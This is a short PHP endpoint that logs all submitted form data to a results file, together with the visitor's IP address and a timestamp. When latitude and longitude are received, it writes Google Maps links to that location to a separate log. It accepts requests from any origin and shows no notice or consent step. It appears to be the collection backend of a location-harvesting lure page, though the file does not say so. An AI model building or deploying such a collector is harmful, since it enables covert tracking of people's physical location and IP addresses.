<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$data = $_POST;
$data['ip'] = $_SERVER['REMOTE_ADDR'];
$data['timestamp'] = date('Y-m-d H:i:s');

$logFile = '../logs/result.txt';
file_put_contents($logFile, json_encode($data) . "\n", FILE_APPEND);

if (isset($data['lat']) && isset($data['lon'])) {
    $lat = str_replace(' deg', '', $data['lat']);
    $lon = str_replace(' deg', '', $data['lon']);
    $mapsUrl = "https://www.google.com/maps/place/{$lat}+{$lon}";
    file_put_contents('../logs/maps.txt', $mapsUrl . "\n", FILE_APPEND);
}

echo json_encode(['status' => 'success']);
?>